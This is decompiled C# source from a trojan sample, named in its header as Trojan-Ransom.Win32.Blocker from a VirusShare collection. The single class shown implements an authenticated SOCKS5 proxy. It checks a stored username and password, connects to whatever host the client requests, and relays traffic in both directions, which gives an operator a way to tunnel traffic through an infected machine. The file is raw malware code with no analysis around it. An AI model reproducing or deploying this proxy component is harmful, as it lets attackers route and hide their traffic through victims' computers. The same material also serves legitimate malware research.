// Decompiled with JetBrains decompiler
// Type: insomnia.Class21
// Assembly: insomnia, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 848092D5-5192-4B4F-B8F0-07AD40D025FA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.exyo-803dbe7f976d166aef05102db1219065c8b0bb78e3cf85095fc361f891e6a4e0.exe

using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace insomnia
{
  internal class Class21
  {
    private string Field9 = Class26.Field2;
    private string Field8 = Class26.Field1;
    private TcpClient Field7;
    private TcpClient Field6;
    private byte Field5 = 5;
    private byte Field4 = 2;
    private byte Field3;
    private byte Field2 = 1;
    private byte Field1 = 3;

    public Class21(TcpClient client) => this.Field7 = client;

    public void Method1()
    {
      NetworkStream stream1 = this.Field7.GetStream();
      byte[] buffer1 = new byte[2];
      stream1.Read(buffer1, 0, 2);
      byte[] buffer2 = new byte[(int) buffer1[1]];
      stream1.Read(buffer2, 0, buffer2.Length);
      byte[] buffer3 = new byte[2]
      {
        this.Field5,
        this.Field4
      };
      stream1.Write(buffer3, 0, 2);
      ASCIIEncoding asciiEncoding = new ASCIIEncoding();
      byte[] buffer4 = new byte[64];
      stream1.Read(buffer4, 0, 64);
      Convert.ToInt32(buffer4[0]);
      int int32_1 = Convert.ToInt32(buffer4[1]);
      int int32_2 = Convert.ToInt32(buffer4[int32_1 + 2]);
      byte[] bytes1 = new byte[int32_1];
      for (int index = 0; index <= int32_1 - 1; ++index)
        bytes1[index] = buffer4[index + 2];
      byte[] bytes2 = new byte[int32_2];
      for (int index = 0; index <= int32_2 - 1; ++index)
        bytes2[index] = buffer4[index + int32_1 + 3];
      string str1 = asciiEncoding.GetString(bytes1);
      string str2 = asciiEncoding.GetString(bytes2);
      if (str1.Equals(this.Field9) && str2.Equals(this.Field8))
      {
        byte[] buffer5 = new byte[2]
        {
          this.Field5,
          this.Field3
        };
        stream1.Write(buffer5, 0, 2);
      }
      else
      {
        byte[] buffer6 = new byte[2]
        {
          this.Field5,
          (byte) 2
        };
        stream1.Write(buffer6, 0, 2);
      }
      byte[] buffer7 = new byte[4];
      stream1.Read(buffer7, 0, 4);
      string hostname = "";
      if ((int) buffer7[3] == (int) this.Field2)
      {
        byte[] numArray = new byte[4];
        stream1.Read(numArray, 0, 4);
        hostname = new IPAddress(numArray).ToString();
      }
      else if ((int) buffer7[3] == (int) this.Field1)
      {
        byte[] buffer8 = new byte[1];
        stream1.Read(buffer8, 0, 1);
        byte[] numArray = new byte[(int) buffer8[0]];
        stream1.Read(numArray, 0, (int) buffer8[0]);
        hostname = Encoding.Default.GetString(numArray);
      }
      else
      {
        try
        {
          Class31.Method3("[SOCKS]: Address type unsupported -> " + buffer7[3].ToString(), Class26.Field8);
        }
        catch
        {
        }
      }
      if (hostname != "")
      {
        byte[] buffer9 = new byte[2];
        stream1.Read(buffer9, 0, 2);
        int uint16 = (int) BitConverter.ToUInt16(new byte[2]
        {
          buffer9[1],
          buffer9[0]
        }, 0);
        this.Field6 = new TcpClient(hostname, uint16);
        if (this.Field6.Connected)
        {
          byte[] buffer10 = new byte[10];
          buffer10[0] = this.Field5;
          buffer10[1] = this.Field3;
          buffer10[2] = (byte) 0;
          buffer10[3] = (byte) 1;
          IPAddress ipAddress = IPAddress.Parse(this.Field6.Client.LocalEndPoint.ToString().Split(':')[0]);
          buffer10[4] = ipAddress.GetAddressBytes()[0];
          buffer10[5] = ipAddress.GetAddressBytes()[1];
          buffer10[6] = ipAddress.GetAddressBytes()[2];
          buffer10[7] = ipAddress.GetAddressBytes()[3];
          int num = int.Parse(this.Field6.Client.LocalEndPoint.ToString().Split(':')[1]);
          buffer10[8] = BitConverter.GetBytes((ushort) num)[0];
          buffer10[9] = BitConverter.GetBytes((ushort) num)[1];
          stream1.Write(buffer10, 0, 10);
          NetworkStream stream2 = this.Field6.GetStream();
          bool flag = false;
          while (this.Field6.Connected && this.Field7.Connected && !flag)
          {
            Thread.Sleep(100);
            try
            {
              if (stream1.DataAvailable)
              {
                byte[] numArray1 = new byte[10000];
                int length = stream1.Read(numArray1, 0, 10000);
                byte[] numArray2 = new byte[length];
                Array.Copy((Array) numArray1, (Array) numArray2, length);
                stream2.Write(numArray2, 0, numArray2.Length);
              }
              if (stream2.DataAvailable)
              {
                byte[] numArray3 = new byte[10000];
                int length = stream2.Read(numArray3, 0, 10000);
                byte[] numArray4 = new byte[length];
                Array.Copy((Array) numArray3, (Array) numArray4, length);
                stream1.Write(numArray4, 0, numArray4.Length);
              }
            }
            catch
            {
              flag = true;
            }
          }
          if (this.Field7.Connected)
            this.Field7.Close();
          if (!this.Field6.Connected)
            return;
          this.Field6.Close();
        }
        else
        {
          try
          {
            Class31.Method3("[SOCKS]: Connection to target host failed.", Class26.Field8);
          }
          catch
          {
          }
        }
      }
      else
      {
        try
        {
          Class31.Method3("[SOCKS]: Terminating host connection.", Class26.Field8);
        }
        catch
        {
        }
      }
    }
  }
}
